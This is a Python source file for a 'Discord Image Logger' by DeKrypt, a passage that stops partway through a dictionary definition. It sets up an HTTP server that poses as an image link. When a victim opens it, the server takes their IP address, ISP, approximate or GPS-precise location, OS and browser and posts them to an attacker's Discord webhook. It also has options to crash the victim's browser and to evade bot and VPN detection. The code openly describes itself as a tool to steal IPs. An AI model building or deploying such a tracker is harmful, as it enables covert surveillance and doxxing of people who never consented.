# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/your/webhook",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
